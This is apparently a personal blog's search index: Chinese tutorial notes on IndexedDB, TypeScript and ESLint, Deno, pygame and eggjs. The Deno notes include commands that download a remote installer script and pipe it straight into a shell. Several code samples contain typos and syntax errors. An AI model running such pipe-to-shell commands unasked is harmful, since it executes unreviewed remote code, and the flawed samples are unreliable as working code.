数据库是一系列相关的容器，每个域名（协议+端口+域名）都可以新建任意多个数据库， 同时indexedDB数据库有版本的概念，同一时刻只能有一个版本的数据库存在，如果要修改数据库结构，只能通过升级数据库版本完成 对象仓库 每个数据库包含若干个对象仓库， 类似于关系型数据库的表格 数据记录 对象仓库保存的数据记录，每个记录类似于关系型数据库的行，但是只有逐渐和数据体两部分，主键用来建立默认索引，必须是不同的 索引 为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引 事务 数据记录的读写和删改都要通过事务完成。事务对象提供error,about和complete三个事件，用来监听操作结果 操作流程 打开数据库 12345678910111213141516171819202122232425// 打开数据库var request = window.indexedDB.open(databaseName, version)// 改方法接受两个参数，第一个参数是字符串，表示数据库的名字，如果指定的数据不存在，就会创建新的数据库，第二个是整数，表示数据库版本，如果省略，// indexedDB.open()返回一个IDBRequest对象。这个对象通过三个事件error,success,upgradeneeded 处理数据库的操作结果// error 事件表示打开数据库失败request.onerror = function(event) &#123; console.log(&#x27;数据库打开失败&#x27;)&#125;// success 事件表示成功打开的数据var dbrequest.onsuccess = function(event) &#123; db.request.result console.log(&#x27;数据库打开成功&#x27;)&#125; // success 事件表示成功打开的数据 此时通过request对象的result属性拿到数据库对象var dbrequest.onsuccess = function(event) &#123; db.request.result console.log(&#x27;数据库打开成功&#x27;)&#125; // upgradeneeded 事件如果指定的版本号大于数据的实际版本号，就会发生数据库升级事件 此时通过request对象的result属性拿到数据库对象var db;request.onupgradeneeded = function (event) &#123; db = event.target.result;&#125; 新建数据库 新建数据库和打开数据库是同一个操作，如果指定的数据库不存在就会创建，后续的操作主要是在upgradeneeded事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件 通常新建数据库之后，第一件事是新建对象仓库（即新建表） 1234request.onupgradeneeded = function(event) &#123; db = event.target.result var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123;keyPath: &#x27;id&#x27;&#125;)&#125; 上述代码，数据库新建成功之后，新增一张叫做person的表格，主键是id 更好的写法是先判断一下这张表格是否存在，如果不存在再新建 1234567request.onupgradeneeded = function (event) &#123; db = event.target.result var objectStore; if(!db.objectStoreNames.contains(&#x27;person&#x27;)) &#123; objectStore = db.createObjectStore(&#x27;person&#x27;, &#123;keyPath: &#x27;id&#x27;&#125;) &#125;&#125; 如果数据记录里面没有适合主键的属性，那么可以让indexedDB自动生成主键 1var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123;autoIncrement: true&#125;) 新建对象仓库之后，可以新建索引 123456request.onupgradeneeded = function(event) &#123; db = event.target.result var objectStore = db.createObejctStore(&#x27;person&#x27;, &#123;keyPath: &#x27;id&#x27;&#125;) objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123;unique: false&#125;) objectStore.createIndex(&#x27;email&#x27;, &#x27;email&#x27;, &#123;unique: false&#125;)&#125; 新增数据 新增数据指的是向对象仓库写入数据记录，这需要通过事务完成 1234567891011121314function add() &#123; var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;) .objectStore(&#x27;person&#x27;).add(&#123;id: 1, name: &#x27;张三&#x27;, &#x27;age&#x27;: 24, email: &#x27;zhangsan@example.com&#x27;&#125;) request.onsuccess = function (event) &#123; console.log(&quot;数据写入成功&quot;) &#125; request.onerror = function(event) &#123; console.log(&quot;数据写入失败&quot;) &#125;&#125;add() 写入数据需要新建一个事务，新建事务时必须指定表格名称和操作模式(“只读”,”读写”)，新建事务后，通过IDBTransaction.objectStore(name)方法拿到IDBObjectStore对象，在通过表格对象的add()方法，向表格写入一条数据 写入是一个异步操作，通过监听连接对象的success事件和error事件，了解事件是否写入成功 读取数据 读取数据也是通过事务完成 1234567891011121314151617181920function read() &#123; var transaction = db.transaction([&#x27;person&#x27;]) var objectStore = transaction.objectStore(&#x27;person&#x27;) // objectStore.get(1) 参数是主键的值 var request = objectStore.get(1) request.onerror = function(event) &#123; console.log(&quot;事务失败&quot;) &#125; request.onsuccess = function(event) [ if(request.result) &#123; console.log(&#x27;name:&#x27; + request.result.name) console.log(&#x27;age:&#x27; + request.result.age) console.log(&#x27;email:&#x27; + request.result.email) &#125; else &#123; console.log(&#x27;没有获取到数据&#x27;) &#125; ]&#125; 遍历数据 遍历数据表格的所有记录，要使用指针对象IDBCursor 1234567891011121314151617function readAll() &#123; var objectStore = db.transaction(&#x27;person&#x27;).objectStore(&#x27;person&#x27;) objectStore.openCursor().onsuccess = function(event) &#123; var cursor = event.target.result if(cursor) &#123; console.log(&#x27;Id: &#x27; + cursor.key); console.log(&#x27;Name: &#x27; + cursor.value.name); console.log(&#x27;Age: &#x27; + cursor.value.age); console.log(&#x27;Email: &#x27; + cursor.value.email) cusor.continue() &#125; else &#123; console.log(&#x27;没有更多数据了！&#x27;) &#125; &#125;&#125;readAll() 上述代码中，新建指针对象的openCursor()方法是一个异步操作，所以要监听success时间 更新数据 更新数据用IDBObject.put()方法 1234567891011121314function update() &#123; var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;) .objectStore(&#x27;person&#x27;) .put(&#123;id: 1, name: &#x27;李四&#x27;， age: 35, email: &#x27;lisi@example.com&#x27;&#125;) request.onsuccess = function (event) &#123; console.log(&#x27;数据更新成功&#x27;) &#125; request.onerror = function(event) &#123; console.log(&#x27;数据更新失败&#x27;) &#125;&#125;update() 删除数据 IDBOjectStore.delete()方法用于删除记录 123456789function remove() &#123; var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;) .objectStore(&#x27;person&#x27;) .delete(1) request.onsuccess = function (event) &#123; console.log(&#x27;数据删除成功&#x27;); &#125;&#125;remove() 使用索引索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值） 123456789101112131415objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);var transaction = db.transaction([&#x27;person&#x27;], &#x27;readonly&#x27;);var store = transaction.objectStore(&#x27;person&#x27;);var index = store.index(&#x27;name&#x27;);var request = index.get(&#x27;李四&#x27;);request.onsuccess = function (e) &#123; var result = e.target.result; if (result) &#123; // ... &#125; else &#123; // ... &#125;&#125; myself understand 使用 window.indexedDB.open(databaseName, version) 创建数据库的时候如果数据库不存在，会触发 onupgradeneeded 方法 如果 创建数据库的时候数据库已存在, 会触发 onsuccess方法 在实际应用中，我们应该先触发一次onupgradeneeded来创建数据库和我们所需要的表 然后在onsuccess方法中实现自己想要实现的方法 表格的增删一般在数据库版本变更的时候操作 即在onupgradeneeded方法中 数据的增删查等操作一般在onsuccess方法中实现，此时不能涉及到数据库版本变更，否则会报错","tags":[{"name":"browser","slug":"browser","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/browser/"},{"name":"localStorage","slug":"localStorage","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/localStorage/"},{"name":"indexedDB","slug":"indexedDB","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/indexedDB/"}]},{"title":"TypeScript 学习之路进阶版 - 扩展","date":"2020-06-29T11:39:30.000Z","path":"2020/06/29/typescript-study-05/","text":"代码检查 eslint 能够发现一些tsc不会关心的错误，检查出一些潜在的问题 TypeScript中使用Eslint eslint安装 1npm install eslint -S 由于ESLint 默认使用Espree进行语法解析，无法识别TypeScript中的一些语法，因此我们需要安装@typescript-eslint/eslint-plugin, 他作为eslint默认规则的补充，提供了一些额外的适用于ts语法的规则 1npm install --save-dev @typescript-eslint/eslint-plugin 创建配置文件 ESLint 需要配置文件来决定对哪些规则进行检查配置文件的名称一般是.eslintrc.js或.eslintrc.json 当运行ESLint的时候检查一个文件，他会首先尝试读取到文件的目录下的配置文件，然后一级一级往上查找，将所找到的配置合并起来 在根目录创建一个.eslintrc.js 12345678910111213module.exports = &#123; parser: &#x27;@typesript-eslint/parser&#x27;, plugins: [&#x27;@typescript-eslint&#x27;], rules: &#123; // 禁止使用var &#x27;no-var&#x27;: &#x27;error&#x27;, // 优先使用interface 而不是type &#x27;@typescript-eslint/consistent-type-difinitions&#x27;: [ &#x27;error&#x27;, &#x27;interface&#x27; ] &#125;&#125; 以上配置中，指定了两个规则，其中no-var 是ESLint原生规则，@typescript-eslint/consistent-type-definitions 是 @typescript-eslint/elsint-plugin 新增的规则 规则的取值一般是一个数组，其中一项是 off,warn,error中的一个，表示关闭，警告和报错，后面的项都是该规则的其他配置 关闭、警告和报错的含义如下： 关闭： 禁用此规则 警告： 代码检查的时候输出错误信息，但是不会影响到exit code 报错： 发现错误时，不仅会输出错误信息而且exit code 将被设为 1（一般exit code 不为0 则表示执行出现错误）","tags":[{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"}]},{"title":"TypeScript 学习之路进阶版 - 泛型","date":"2020-06-28T01:17:07.000Z","path":"2020/06/28/typescript-study-04/","text":"泛型 泛型是指在定义函数、接口或者类的时候，不预选指定类的具体累心，而是在使用的时候在指定类型的一种特性 123456789function createArray&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray&lt;string&gt;(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;] 我们在函数名后添加了&lt;T&gt;, 其中T用来指代任意输入的类型，在后面的输入和输出都可以使用 在调用的时候可以指定他的具体的类型，也可以不指定，而让类型推论自动推算出来 多个类型参数 定义泛型的时候,可以一次定义多个类型参数 12345function swap&lt;T, U&gt;(tuple: [T, U]): [U, T] &#123; return [tuple[1], tuple[0]];&#125;swap([7, &#x27;seven&#x27;]); // [&#x27;seven&#x27;, 7] 输入的&lt;T, U&gt;是元组 泛型约束 在函数内部使用泛型变量的时候，由于事先不知道它是那种类型的，所以不能随意操作它的属性和方法 这时我们可以对泛型进行约束，只允许这个函数传入那些包含length属性的变量 12345678interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125; 在上面的例子中，我们使用了extends约束了泛型T必须符合接口l的形状，也就是必须包含length属性 多个类型参数之间也可以互相约束 12345678910function copyFields&lt;T extends U, U&gt;(target: T, source: U): T &#123; for (let id in source) &#123; target[id] = (&lt;T&gt;source)[id]; &#125; return target;&#125;let x = &#123; a: 1, b: 2, c: 3, d: 4 &#125;;copyFields(x, &#123; b: 10, d: 20 &#125;); 我们使用了两个类型参数，其中要求T继承于U，这样就保证了U中不会出现T中不存在的字段 泛型接口 1234567891011121314interface CreateArrayFunc&lt;T&gt; &#123; (length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc&lt;any&gt;;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125;createArray(3, &#x27;x&#x27;); // [&#x27;x&#x27;, &#x27;x&#x27;, &#x27;x&#x27;] 在使用泛型接口的时候，需要定义泛型的类型 泛型类 与泛型接口类似，泛型也可以用于类的类型定义 12345678class GenericNumber&lt;T&gt; &#123; zeroValue: T; add: (x: T, y: T) =&gt; T;&#125;let myGenericNumber = new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue = 0;myGenericNumber.add = function(x, y) &#123; return x + y; &#125;; 泛型参数的默认类型 我们可以为泛型中的类型参数指定默认类型，从实际值参数中也无法推测出时，这个默认类型就会起作用 1234567function createArray&lt;T = string&gt;(length: number, value: T): Array&lt;T&gt; &#123; let result: T[] = []; for (let i = 0; i &lt; length; i++) &#123; result[i] = value; &#125; return result;&#125; 声明合并 如果定义了两个相同名字的函数、接口或类，那么它们会合并成一个类型 函数的合并 可以使用重载定义多个函数类型 123456789function reverse(x: number): numberfunction reverse(y:number): stringfunction reverse(x: number | string): number | string &#123; if (typeof x === &#x27;number&#x27;) &#123; return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)) &#125; else if (typeof x === &#x27;string&#x27;) &#123; return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125; &#125; 接口的合并 接口的属性在合并时会简单的合并到一个接口中 12345678910111213interface Alarm &#123; price: number&#125;interface Alarm &#123; weight: number&#125;// 相当于interface Alarm &#123; price：number; weight: number&#125; 合并的属性的类型必须是唯一的 1234567891011121314interface Alarm &#123; price: number&#125;interface Alarm &#123; price: number weight: number&#125;// 相当于interface Alarm &#123; price：number; weight: number&#125; 假如 price 的类型不一致就会报错 接口中方法的合并与函数的合并一样","tags":[{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"}]},{"title":"typescript 学习之路进阶版  -  2","date":"2020-06-22T08:31:39.000Z","path":"2020/06/22/typescript-study-03/","text":"类和接口 类实现接口 实现(implements)是面向对象中一个重要概念,一般来讲,一个类只能继承自另一个类,有时候不同类之间可以有一些共有特性,这时候可以把特新提取成接口(interfaces), 用implements关键字来实现,这个特新大大提高了面向对象的灵活性 1234567891011121314151617interface Alarm &#123; alert(): void&#125;class Door &#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert() &#123; console.log(&#x27;securityDoor) &#125;&#125;class Car implements Alarm &#123; alert() &#123; console.log(&#x27;car&#x27;) &#125;&#125; 一个类可以实现多个接口 12345678910interface Alarm &#123; alert(): void&#125;interface Light &#123; lightOn(): void; lightOff(): void;&#125;class Car implements Alarm, Light &#123;&#125; 接口继承接口 接口与接口之间也可以是继承关系,并拥有继承的方法 123456interface Alarm &#123; alert(): void;&#125;interface Light extends Alarm &#123;&#125; 接口继承类 常见的面向对象语言中,接口是不能继承类的,但是在TypeScript中是可以的 1234567891011121314class Point &#123; x: number; y: number; constructor(x: number, y: number) &#123; this.x = x; this.y = y; &#125;&#125;interface Point3d extends Point &#123; z: number;&#125;let point3d: Point3d = &#123;x: 1, y: 2, z: 3&#125;; 当我们在声明 class Point 时,除了会创建一个名为Point的类外,同时也创建了一个名为Point类型(实例的类型) 所以我们既可以将Point当作一个类来用 也可以将Point当作一个类型来用 (使用:Point表示参数的类型) 当我们声明 interface Point3d extends Point的时候,Point3d继承的实际上是类Point的实例的类型,定义了一个接口Point3d继承了另一个接口PointInstaneType 声明point类时创建的Point类型是不包含构造函数的,静态属性和静态方法也是不包含的","tags":[{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"},{"name":"ES6","slug":"ES6","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/ES6/"}]},{"title":"Deno 学习","date":"2020-06-16T08:25:19.000Z","path":"2020/06/16/learn-Deno/","text":"首先我们先谈一下nodeJs的无法忽视的问题 nodeJs对于 ES6的新的语法特性 Promise接口 和async函数 和ES模块 的支持并不理想, NodeJs 必须支持回调函数(callback) 导致异步接口会有promise 和回调函数两种写法,同时NodeJs自己的模块格式 CommonJs和ES模块不兼容 nodeJs 的模块管理工具 npm 的逻辑越来越复杂, 模块安装目录极其庞大,难以管理, nodeJs 几乎没有安全措施,用户只要下载了外部模块,就只好任凭别人代码在本地运行,进行各种读写操作 什么是Deno Deno和nodeJs一样,也是一个服务器运行,但是支持多种语言,可以直接运行在JavaScript,TypeScript和WebAssembly程序 并且内置了V8引擎,用来解释JavaScript,同时,也内置了tsc引擎,解释TypeScript,使用Rust语言开发, 由于Rust原生支持WebAssemly, 所以它也能直接运行WebAssemly Rust 提供了许多现成的模块，对Deno项目来说，可以节约很多开发时间 Deno 只有一个可执行文件，所有操作都通过这个文件完成，支持跨平台 Deno具有安全控制，默认下脚本不具有读写权限，如果脚本未授权就读写文件系统或者网络就会报错，必须使用参数，显示打开权限才可以 1234--allow-read：打开读权限，可以指定可读的目录，比如--allow-read=/temp。--allow-write：打开写权限。--allow-net=google.com：允许网络通信，可以指定可请求的域，比如--allow-net=google.com。--allow-env：允许读取环境变量 Deno支持Web Api 尽量保持和浏览器一致，提供了window这个全局对象，同时支持fetch，webCrypto，worker等web标准，同时也支持onload，onunload，addEventListener等时间的操作函数，另外 Deon的所有异步操作都返回Promise Deno只支持ES模块。和浏览器的模块加载规则一致，没有npm和npm_modules目录，没有require()命令，也不需要package.json所有的模块通过URL加载，比如 import &#123; bar &#125; from &quot;https//foo.com/bar.ts&quot;(绝对URL)或者 import &#123; bar &#125; from &quot;./foo/bar.ts&quot;(相对URL)，因此Deno不需要一个中心化的模块储存系统，可以从任何方式加载模块Deno 下载模块以后，会有一个总的目录，在本地缓存模块，因此可以离线使用 Deno 只支持从URL 加载模块，导致nodeJs 的模块加载写法都会失效，Deno的所有模块都要通过入口脚本加载，不能通过模块名加载，所以必须带有脚本后缀名 Deno 原生支持TypeScript语言，可以直接运行，不必显示转码他的内部会根据文件名后缀判断，如果是.ts后缀名，就先调用TS编译器，将其编译成JavaScript 如果是.js后缀名，就直接传入V8引擎运行 Deno内置了开发中需要的各种功能，不需要外部工具，打包、格式清理、测试、安装、文档生成、liniting、脚本编辑成可执行文件 12345678910deno bundle：将脚本和依赖打包deno eval：执行代码deno fetch：将依赖抓取到本地deno fmt：代码的格式美化deno help：等同于-h参数deno info：显示本地的依赖缓存deno install：将脚本安装为可执行文件deno repl：进入 REPL 环境deno run：运行脚本deno test：运行测试 安装DenoShell (Mac, Linux): 1curl -fsSL https://deno.land/x/install/install.sh | sh PowerShell (Windows): 1iwr https://deno.land/x/install/install.ps1 -useb | iex Homebrew (Mac): 1brew install deno Chocolatey (Windows): 1choco install deno Scoop (Windows): 1scoop install deno Build and install from source using Cargo 1cargo install deno 查看版本 1deno --version 命令行直接deno 就会进入 REPL环境 12345deno&gt; console.log(1,2,3)1 2 3undefined&gt; 运行脚本 123$ deno run \\https://deno.land/std/examples/curl.ts \\https://example.com 上面的例子中， Deno执行远程脚本curl.ts,用这个脚本去抓取网址example.com,但是会提示没有网络通讯权限，给予Deno网络通信权限，就可以顺利执行 123$ deno run --allow-net \\https://deno.land/std/examples/curl.ts \\https://example.com","tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/nodejs/"},{"name":"deno","slug":"deno","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/deno/"}]},{"title":"typescript 学习之路进阶版","date":"2020-06-10T02:57:48.000Z","path":"2020/06/10/typescript-study-02/","text":"类型别名12345678910type Name = string;type NameResolver = () =&gt; string;type NameOrResolver = Name | NameResolver;function getName(n: NameOrResolver): Name &#123; if (typeof n === &#x27;string&#x27;) &#123; return n; &#125; else &#123; return n(); &#125;&#125; 类型别名为类型创建新名称。类型别名有时类似于接口，但是可以命名原语，并集，元祖和其他必须手动编写的其他类型。 别名实际上并不会创建新的类型，他会创建一个新名称来引用该类型123456789101112131415161718192021222324type Container&lt;T&gt; = &#123;value: T&#125;// 也可以在属性中使用类型别名来引用自身type Tree&lt;T&gt; = &#123; value: T; left: Tree&lt;T&gt;; right: Tree&lt;T&gt;;&#125;// 与交叉点类型一起使用type LinkedList&lt;T&gt; = T &amp; &#123;next: LinkedList&lt;T&gt;&#125;interface Person &#123; name: string&#125;var people: LinkedList&lt;Person&gt;var s = people.namevar s = people.next.namevar s = people.next.next.namevar s = people.next.next.next.name// 但是类型别名不可能出现在声明右侧的任何其他位置 字符串字面量类型123456type EventNames = &#x27;click&#x27; | &#x27;scroll&#x27; | &#x27;mousemove&#x27;function handleEvent(ele: Element, event: EventNames) &#123; // do someting&#125;handleEvent(document.getElementById(&#x27;hello&#x27;), &#x27;scroll&#x27;) // successhandleEvent(document.getElementById(&#x27;hello&#x27;), &#x27;dblclick&#x27;) // error 我们使用type定了一个字符串字面量类型EventNames, 它只能取三种字符串中的一种类型别名与字符串字面量类型都是使用type进行定义 可以使用相同的方式使用字符串文字类型来区分重载12345function createElement(tagName: &#x27;img&#x27;): HTMLImageElementfunction createElement(tagName: &#x27;input&#x27;): HTMLIputElementfunction createElement(tagName: &#x27;string&#x27;): Element &#123;&#125; 元组数组合并了相同类型的对象，而元组(Tuple)合并了不同类型的对象 eg:1let tom: [string, number] = [&#x27;Tom&#x27;, 25]当赋值或访问一个已知的索引元素时,会得到正确的类型也可以只赋值其中一项 12let tom: [string, number]tom[0] = &#x27;Tom&#x27; 如果直接对元组类型的变量进行初始化或者赋值的时候,需要提供所有的元组类型中指定的项 当添加越界的元素时,它的类型会被限制为元组的每个类型的联合类型 枚举 Enum枚举类型用于取值被限定在一定范围内的场景,比如一周只能有七天,颜色限定为红绿蓝等 eg:枚举定义 使用enum定义1234567enum Days &#123;Sun, Mon, Tue, Web, Thu, Fri, Sat&#125;// 枚举成员会被赋值从0开始递增的数字,同时也会对枚举值到枚举名进行反向映射Days[&#x27;Sun&#x27;] === 0 // trueDays[0] === &#x27;Sun&#x27; // true 手动赋值 我们也可以手动给枚举项赋值 12enum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;// 未手动赋值的枚举项会接着上一个枚举项递增 如果手动赋值的枚举项与自动赋值的枚举项重复了,并不会报错 手动赋值的枚举项可以不是数字,但是需要使用类型断言来无视类型检查 常数项和计算所得项 枚举有两种类型: 常数项和计算所得项 1enum Color &#123;Red, Green, Blue = &#x27;blue&#x27;.length&#125; 上面 &#39;blue&#39;.length就是一个计算所得项 如果紧接在计算所得项后面是未手动赋值的项,那么会因为无法获得初始值而报错 常数枚举 1234567const enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Direction.Left, Direction.Down] 常数枚举与普通枚举的区别是,它会在编译阶段被删除,并且不能包含计算成员 上述编译的结果是: 1var directions = [0 /* Up */ , 1 /* Up */, 2 /* Up */, 3 /* Up */] 如果在定义的时候包含了计算成员,则会在编译阶段报错 外部枚举 外部枚举 是使用declare enum 定义的枚举类型 1234567declare enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Direction.Left, Direction.Down] 同时使用declare 和const也是可以的 类类的概念 类：定义了一件事物的抽象特点，包含他的属性和方法 对象：类的实例，通过new生成 面对对象（OPP）三大特性： 封装、继承、多态 封装（Encapsulation）：将对数据的操作细节隐藏起来，质保楼对外的接口，外界调用端不需要知道细节，就能通过对外提供的接口来访问该对象，同时也保证了外界无法任意更改对象内部的数据 继承（Inheritance）：子类继承父类，子类除了拥有父类的所有特性外，还有一些更具体的特性 多态（Poluymorphism）：由继承而产生的不同的类，对同一个方法可以有不同的响应，程序会自动判断应该如何执行 存取器(getter &amp; setter): 用于改变属性的读取和赋值行为 修饰符(Modifiers): 修饰符是一些关键字,用于限定成员或类型的性质,比如public表示共有属性和方法 抽象类(Abstract Class): 抽象类是供其他继承的基类,抽象类不允许被实例化,抽象类中的抽象方法必须在子类中被实现 接口(interface): 不同类之间巩固偶的属性和方法可以抽象成一个接口,接口可以被类实现,一个类只能继承自另一个类,但是可以实现多个接口 ES6中类的用法 属性和方法 使用class定义类,使用constructor定义构造函数 通过new 生成新实例的时候,会自动带调用构造函数 类的继承 使用extends 关键字实现继承,子类通过super关键字调用父类的构造函数和方法 123456789class Cat extends Animal &#123; constructor(name) &#123; super(name); console.log(this.name) &#125; sayHi() &#123; return super.sayHi() &#125;&#125; 存取器 使用getter和setter可以改变属性的赋值和读取行为 1234567891011class Animal &#123; constructor(name) &#123; this.name = name &#125; get name() &#123; return &#x27;jack&#x27; &#125; set name(value) &#123; console.log(&#x27;setter:&#x27; + value) &#125;&#125; 静态方法 使用static修饰符修饰的方法称为静态方法,不需要实例化,而是直接通过类来调用 12345678class Animal &#123; static isAnimal(a) &#123; return a instanceof Animal &#125;&#125;let a = new Animal(&#x27;Jack)Animal.isAnimal(a) // truea.isAnimal(a) // TypeError ES7中类的用法 实例属性 ES6中实例的属性只能通过构造函数中的this.xxx来定义,ES7可以直接在类里面定义 123456789// ES7class Animal &#123; name = &#x27;Jack&#x27;; constructor() &#123; // TODO something &#125; let a = new Animal()&#125; 静态属性 可以用static 定义一个静态属性 12345678// ES7class Animal &#123; static name = &#x27;Jack&#x27;; constructor() &#123; // TODO something &#125; let a = new Animal()&#125; TypeScript中使用类 public private和protect TypeScript中可以使用三种访问修饰符分别是public,private,protected public修饰的属性或方法是共有的,可以在任何地方被访问,默认所有的属性和方法都是public的 private修饰的属性和方法是私有的,不能在声明它的类的访问’ protected修饰的属性和方法是受保护的,它和private类似,区别是在子类中也是允许被访问的 当构造函数constructor修饰为private时,该类不允许被继承或者实例化当构造函数constructor修饰为protected时, 该类只允许被继承 参数属性 修饰符和readonly还可以使用构造函数参数中,等同于类中定义该属性的同时给该属性赋值,使代码更简洁 12345class Animal &#123; public construtor(public name) &#123; // 等同于 this.name = name &#125;&#125; readonly 只读属性关键字,只允许出现在属性声明或索引签名或构造函数中如果readonly和其他修饰符同时存在的话,需要写在后面 抽象类 abstract用于定义抽象类和其中的抽象方法 抽象类是不允许被实例化的 如果定义了一个抽象类,并且定义了一个抽象方法sayHi, 在实例化抽象类的时候报错 抽象类中的抽象方法必须被子类实现,如果继承了抽象类,却没有实现抽象类中的抽象方法,就是编译报错 正确使用抽象类 123456789101112131415abstract class Animal &#123; public name; public constructor(name) &#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public sayHi() &#123; console.log(`Meow, My name is $&#123;this.name&#125;`); &#125;&#125;let cat = new Cat(&#x27;Tom&#x27;); 类的类型给类加上TypeScript的类型 123456789101112class Animal &#123; name: string; constructor(name: string) &#123; this.name = name; &#125; sayHi(): string &#123; return `My name is $&#123;this.name&#125;`; &#125;&#125;let a: Animal = new Animal(&#x27;Jack&#x27;);console.log(a.sayHi()); // My name is Jack","tags":[{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"},{"name":"ES6","slug":"ES6","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/ES6/"}]},{"title":"python学习之路----制作小游戏","date":"2020-06-04T09:38:00.000Z","path":"2020/06/04/use-python-create-game/","text":"安装pygame 1pip install pygame 引入12import pygamefrom pygame.locals import *初始化1pygame.init() 创建一个窗口12screen = pygame.display.set_mode([800,600])// 生成一个 宽800 高600大小的窗口使窗口正常工作1234567// pygame的作用就是为了创建游戏,需要与玩家不断互动,所以需要一个事件一直循环运行,使用while 执行事件循环while True:// 接下来增加事件处理器,pygame包含多种模块,使用paygame.event.get()方法获取所有事件的一个列表,使用for循环迭代处理这个列表中的每一个事件,如果看到quit事件,将while 判断设为false 结束while循环for event in pygame.event.get(): if event.type == pygame.QUIT: mRuning = False pygame.quit() 翻转 flip对于pygame窗口显示的内容，screen对象中都会有这些内容的两个副本，可以看做一个当前屏和一个下一屏，当前屏使我们现在看到的，下一屏是完成翻转之后看到的,完成下一屏上的所有修改,再反转到下一屏,就能看到所有的改变,这样,我们对图形多次修改后flip到图形的新版本,而不是每次对图形做小小修改都更新提示,从而让动画更流程,更新速度更快 12screen.fill([255,255,255])pygame.display.flip() 插入图片 pygame.image 1234imageRect = pygame.image.load(imageUrl)# 图片加载完成之后,我们需要将像素从一个地方复制到另一个地方,像素复制在编程中叫做 快移(blitting),帮助我们将一个图像从一个地方复制到另一个地方screen.blit(imageRect, [0,0]) 音乐播放器 pygame中有一个处理声音的模块,叫 pygame.mixer (混音器)12soundTrack = pygame.mixer.music.load(wavFileName)pygame.mixer.music.play() 事件处理器 在上面通过pygame,event.get() 获取到当前事件集 12345678# 退出event.type == pygame.QUIT# 键盘事件event.type == pygame.KEYDOWN or pygame.KEYUP # 判断键盘值 eg: d键 event.key == K_d # 鼠标事件 鼠标点击事件event.type == pygame.MOUSEBUTTONDOWN pygame 模块模块名 | 功能pygame.down | 访问光驱pygame.cursors | 加载光标pygame.display | 访问设备显示问题pygame.draw | 绘制形状,线和点pygame.event | 管理事件pygame.font | 使用字体pygame.image | 加载和存储图片pygame.joystick | 使用手柄或类似的东西pygame.key | 读取键盘按键pygame.mixer | 读取声音pygame.mouse | 鼠标pygame.movie | 播放视频pygame.music | 播放音频pygame.overlay | 访问高级视频叠加pygame.rect | 管理矩形区域pygame.sndarray | 操作声音数据pygame.sprite | 操作移动图像pygame.surface | 管理图像和屏幕pygame.time | 管理时间和帧消息pygame.transform | 缩放和移动图像 有些模块可能在某些平台上不存在,可以用None来测试123if pygame.transform is None: print &#x27;The transform module is not available&#x27; exit()","tags":[{"name":"python","slug":"python","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/python/"},{"name":"pygame","slug":"pygame","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/pygame/"}]},{"title":"用typescript来写eggjs","date":"2020-05-27T01:41:28.000Z","path":"2020/05/27/egg-typescript/","text":"由于用javasript的某种限制和不足，所以决定使用typescript来写eggjs 初始化typescript1npm init egg --type=ts 使用数据库1npm i --save egg-sequelize mysql2 /config/plugins.ts1234sequlize: &#123; enable: true, package: &#x27;egg-sequelize&#x27;, &#125;,/config/config.default.ts12345678config.sequelize = &#123; dialect: &#x27;mysql&#x27;, host: &#x27;localhost&#x27;, port: 3306, password: &#x27;123456&#x27;, database: &#x27;eic-egg&#x27;, timezone: &#x27;+08:00&#x27;, &#125;;","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"typescript","slug":"typescript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/typescript/"}]},{"title":"eggjs 配置swagger-ui","date":"2020-05-26T02:00:40.000Z","path":"2020/05/26/egg-swagger-ui/","text":"如何在eggjs中搭建一个swagger-ui接口预览文档?下面这篇文章将会教你如何搭建swagger-ui参考文章 安装egg-swagger-doc 插件1npm install egg-swagger-doc -S 配置egg-swagger-doc 默认配置 